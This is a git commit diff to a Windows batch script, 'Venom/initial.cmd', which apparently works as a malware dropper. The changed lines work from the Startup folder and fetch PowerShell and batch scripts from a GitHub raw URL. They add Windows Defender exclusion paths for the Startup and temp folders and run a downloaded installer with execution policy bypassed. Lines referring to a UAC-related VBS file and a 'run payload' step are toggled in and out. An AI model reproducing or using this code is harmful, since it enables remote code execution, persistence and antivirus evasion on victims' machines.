7a12538980a4dc58413e04bcce7707bfe11ff86b
P0k3m0n-unleashed <pokemonunlaeshe@proton.me>
2025-01-31 19:56:27 -0900

    initial run

--- Venom/initial.cmd
+++ Venom/initial.cmd
@@ -18,19 +18,19 @@ cd %STARTUP%
 
 powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/wget.cmd -OutFile wget.cmd"
 
-@rem powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath "C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"; Add-MpPreference -ExclusionPath "$env:temp"
+powershell powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/installer.ps1 -OutFile installer.ps1"; Add-MpPreference -ExclusionPath 'C:/Users/%username%/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'; Add-MpPreference -ExclusionPath '$env:temp'
 
 @rem powershell.exe "Invoke-WebRequest -Uri raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/altnt.ps1 -OutFile altnt.ps1"
 
 @rem powershell powershell.exe -ep bypass "./altnt.ps1
 
-@REM powershell powershell.exe -ep bypass "./installer.ps1"
+powershell powershell.exe -ep bypass "./installer.ps1"
 
-powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/uac1.vbs -OutFile uac1.vbs"
+@rem powershell powershell.exe "Invoke-WebRequest -Uri https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/files/uac1.vbs -OutFile uac1.vbs"
 
 
 @REM run payload
-powershell ./wget.cmd; ./uac1.vbs
+@rem powershell ./wget.cmd; ./uac1.vbs
 
 @REM cd back into initial location
 cd "%INITIALPATH%"
